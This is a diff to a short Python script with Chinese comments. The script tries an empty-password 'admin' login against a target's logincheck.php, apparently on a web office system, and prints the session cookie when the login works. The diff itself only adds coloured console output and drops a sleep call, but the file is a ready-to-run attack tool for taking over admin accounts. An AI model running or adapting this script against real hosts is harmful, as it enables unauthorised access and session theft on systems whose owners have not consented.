@@ -1,9 +1,15 @@
 import requests
 import time
 
+RED = '\x1b[1;91m'
+CYAN = '\033[1;36m'
+GREEN = '\033[1;32m'
+BOLD = '\033[1m'
+END = '\033[0m'
+
 def emptyPwd(host): # 常规空登录以及获取Cookie(全版本)
     content = ''
-    content += '[->] 正在尝试空口令登录' + '\n'
+    print(CYAN + '[->] 正在尝试空口令登录' + END)
     url = host + 'logincheck.php'
     try:
         data = {'UNAME':'admin','PASSWORD':'','encode_type':'1'}
@@ -18,15 +24,14 @@ def emptyPwd(host): # 常规空登录以及获取Cookie(全版本)
             content += '[*] 空口令登录成功！' + '\n'
             content += 'URL地址为:' + host + '\n'
             content += 'Cookie为:' + get_cookie + '\n'
-            print(content)
+            print(GREEN + content + END)
             return content
         else:
             content +=  '[-] 不存在空口令' + '\n'
-            print(content)
+            print(RED + content + END)
             return content
     except:
-        print("[-] 目标不存在空口令漏洞\n")
+        print(RED + "[-] 目标不存在空口令漏洞\n" + END)
 
 def run(host):
-    time.sleep(1)
     emptyPwd(host)
